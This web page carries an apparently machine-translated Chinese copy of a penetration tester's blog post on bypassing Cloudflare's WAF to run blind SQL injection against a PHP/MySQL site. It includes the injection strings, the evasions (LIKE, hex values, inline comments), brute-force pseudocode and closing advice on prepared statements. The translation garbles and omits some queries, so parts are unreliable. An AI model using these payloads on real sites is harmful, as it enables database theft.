<!doctype html><html lang="zh-hans"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>我是如何绕过Cloudflare的SQL注入过滤器的</title><link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous"><link rel="stylesheet" href="/img/css.css?random="><link data-rh="true" rel="icon" href="/img/favicon.ico"/><script data-ad-client="ca-pub-6067137220025946" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script type="text/javascript" src="https://platform-api.sharethis.com/js/sharethis.js#property=5effb96910009800120b8d4d&product=inline-share-buttons" async="async"></script>
<script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?03c1a0f31299b4a2fbb83c34d6beaac9";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script></head><body><div id="my_header"><div class="container"><nav class="navbar navbar-expand-lg"><a class="navbar-brand" href="/"><img alt="diglog" src="/img/logo.v1.gif" class="rounded-sm"></a><button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></button><div class="collapse navbar-collapse" id="navbarNavAltMarkup"><div class="navbar-nav"></div></div></nav></div></div><div class="container"><div id="my_content"><h1 class="page_narrow">我是如何绕过Cloudflare的SQL注入过滤器的</h1><div class="row"><div class="col-lg-12 col-12"><div class="my_story_list_item shadow p-3 mb-5 bg-white rounded"><div class="story_page_pub_time page_narrow">2020-09-19 03:16:11</div><div class="page_narrow text-break page_content"><p>2018年末，我的任务是为一个大型客户端执行Web应用程序安全评估。在使用自动化工具运行标准扫描后，出现了一些有趣的事情：可能存在无法使用该工具利用的SQL注入。原因：CloudFlare的WAF，更具体地说，是它的SQL注入过滤器。</p><p>该应用程序是一个用PHP编写的通用网站，MySQL作为后台数据库管理系统。易受攻击的页面向/index.php终结点提交了包含多部分窗体bodydata的POST请求。老实说，我不记得表格的用法了，这对写作来说真的无关紧要。POST请求如下所示：</p><p>POST/index.php HTTP/1.1Host：*连接：关闭接受-编码：gzip，压缩接受：*/*内容类型：多部分/表单-数据；boundary=dc30b7aab06d4aff91d4285d7e60d4f3--dc30b7aab06d4aff91d4285d7e60d4f3Content-Disposition：表单-数据；名称=&#34；126&#34；#--dc30b7aab06d4aff91d4285d7e60d4f3Content-Disposition：表单-数据；名称=&#34；127&#34；##--dc30b7aab06d4aff91d4285d7e60d4f3Content-Disposition：Form-Data；名称=&#34；Form_id&#34；X-MARK--dc30b7aab06d4aff91d4285d7e60d4f3Content-Disposition：表单数据；name=&#34；96&#34；#--dc30b7aab06d4aff91d4285d7e60d4f3.Content-Disposition：表单数据；名称=&#34；115[]&#34；#--dc30b7aab06d4aff91d4285d7e60d4f3Content-Disposition：表单数据；名称=&#34；125&#34；#--dc30b7aab06d4aff91d4285d7e60d4f3--。</p><p>X-Mark处的未清理参数可用于在SQL SELECT查询的WHERE子句的位置注入任意值。例如，如果以上数据作为POST请求的正文发送，则在服务器上执行的SQL查询将如下所示：</p><p>这种注入通常使用的技术是基于时间的BlindSQL注入。问题是，云焰会识别出这些类型的投射，并当场阻止它们。无论我试图进行多么复杂的查询，也不管我使用了多少sqlmap篡改脚本，Cloudflare始终在那里。</p><p>为了解决这个问题，我使用了在对同一请求手动测试SQL注入时所做的观察：我注意到，当我尝试注入代码时，会产生类似以下SQL查询的结果：</p><p>Web服务器响应状态为200 OK。当我尝试注入导致类似此SQL查询的代码时：</p><p>换句话说，当后端的SQL查询没有返回结果时，Web服务器就会抱怨并崩溃(可能是因为后端代码试图访问返回列表中索引超出范围的项)。这给了我一个想法：编写一个脚本，将从所需DBMS实体的名称中挑选的字符与所有字符进行顺序比较。其想法是，如果两个字符匹配，服务器将返回200OK状态，否则将返回500Internal Server error状态，并且我将不得不将请求的字符与mylist中的下一个字符进行比较。</p><p>我的想法是，如果a想要查找第五个表的名称的第一个第二个字符(它们在INFORMATION_schema.tables中列出)，我将首先询问MySQL该字符是否等于‘a’，如果不等于，我将继续使用‘b’、‘c’等。我将首先注入以下字符串(用于与‘a’进行比较)：</p><p>SELECT c1，c2，c3 from t1 WHERE&#39；a&#39；=(SELECT SUBSTRING(TABLE_NAME，2，1)FROM INFORMATION_SCHEMA。表格限制4，1)。</p><p>例如，当我发现表名是t1时，我将使用以下开始注入来暴力强制其列的名称：</p><p>&#39；a&#39；=(SELECT SUBSTRING(COLUMN_NAME，1，1)FROM INFORMATION_SCHEMA。TABLE_NAME=&#34；T1&#34；LIMIT 0，1)的列。</p><p>然后通过以下注入开始从表T1的列C1实际获得值：</p><p>这个想法很好，但Cloudflare会抱怨‘=’标志。注射用。</p><p>会被Cloudflare的WAF阻挡。在稍加修改之后，我提出了以下绕过‘=’限制的请求：</p><p>&#39；A&#39；LIKE(SELECT SUBSTRING(COLUMN_NAME，1，1)FROM INFORMATION_SCHEMA)。TABLE_NAME=&#34；T1&#34；LIMIT 0，1)的列</p><p>注射剂1仍未准备就绪。CloudFlare仍然会抱怨一些东西，更具体地说是注射。</p><p>仍然会被阻止，不是因为LIKE关键字，而是因为‘a’字符。不允许将纯字符串与任何内容进行比较。为了克服这个问题，我想出了下面的注射方法，但没有被晶片检测到：</p><p>上面的注入将字符‘a’作为十六进制编码值‘0x61’发送，该值仍然允许它工作：</p><p>&#39；0x61&#39；LIKE(SELECT SUBSTRING(COLUMN_NAME，1，1)FROM INFORMATION_SCHEMA)。TABLE_NAME=&#34；T1&#34；LIMIT 0，1)的列。</p><p>我必须注册的第三个混淆是在SQL查询关键字之间添加多行注释。CloudFlare会阻止如下查询：</p><p>&#39；0x61&#39；LIKE(SELECT/*TICK COMMENT*/SUBSTRING(COLUMN_NAME，1，1)from/*Tick Comment*/INFORMATION_SCHEMA)。TABLE_NAME=&#34；T1&#34；LIMIT 0，1)的列。</p><p>上述注入是其最终形式，当作为表单值传递给易受攻击的Web应用程序时，如果字符‘a’与第一列名称tablet1的第一个字符匹配，则Web服务器将回复200 OK。</p><p>为了使从应用程序的数据库中检索表内容变得更容易，我用Python编写了一个脚本来自动执行该过程。脚本的伪代码如下所示：</p><p>#断言列名和表名已知字母表=[a，b，c，...，y，z]CharacterPosition=1#我们为[0，20]中的rowNumber强制使用的字符位置：对于ColumnName in column：对于字母表中的字符：sqlInjection=&#39；&#39；0x{hex_encode(Character)}Like(SELECT/*TRICK COMMENT*/SUBSTRING({column nName}，CharacterPosition，1)from/*TRICK COMMENT*/tableName Limit{rowNumber}，1)&#39；&#39；&#39；Inject sqlInjection是POST请求正文IF RESPONSE。STATUS==200：RESULT+=具有Character Position++ELIF响应的字符递归函数。状态==500：继续字母表返回结果中的下一个字符。</p><p>这就是我绕过Cloudflare WAF的SQL注入保护的方式。我买了一件T恤，还在云焰之角找到了一个位置。</p><p>减轻数据库SQL注入的最安全方法是准备语句。它们出现在大多数语言的大多数数据库交互库中。您可以在OWASP上找到减少SQL注入的完整方法列表。我认为，如果开发人员小心地在他们的应用程序上应用安全措施，WAF在大多数情况下是不必要的。您所需要做的就是对用户的输入进行适当的清理。</p></div><div id="story_share_this"><div class="sharethis-inline-share-buttons"></div></div><div class="text-break sotry_link page_narrow"><a target="_blank" href="https://www.astrocamel.com/web/2020/09/04/how-i-bypassed-cloudflares-sql-injection-filter.html">https://www.astrocamel.com/web/2020/09/04/how-i-bypassed-cloudflares-sql-injection-filter.html</a></div><div class="story_tags page_narrow"><button type="button" class="btn btn-light my_tag"><a href="/tag/字符/">#字符</a></button></div></div><div class="my_movie_list_item shadow p-3 mb-5 bg-white rounded"><button type="button" class="btn btn-link my_tag"><a href="/tag/web2.0/">#web2.0</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/google/">#google</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/设计/">#设计</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/创意/">#创意</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/摄影/">#摄影</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/游戏/">#游戏</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/图片/">#图片</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/软件/">#软件</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/视频/">#视频</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/手机/">#手机</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/广告/">#广告</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/apple/">#apple</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/iphone/">#iphone</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/网站/">#网站</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/免费/">#免费</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/下载/">#下载</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/windows/">#windows</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/微软/">#微软</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/firefox/">#firefox</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/苹果/">#苹果</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/blog/">#blog</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/音乐/">#音乐</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/博客/">#博客</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/wordpress/">#wordpress</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/恶搞/">#恶搞</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/艺术/">#艺术</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/qq/">#qq</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/web/">#web</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/谷歌/">#谷歌</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/工具/">#工具</a></button></div></div></div><div id="my_footer"><div class=""><a href="/tags/">tags</a> <a href="/users/">users</a></div>&copy;2012-2021 diglog.com </div></div></body></html>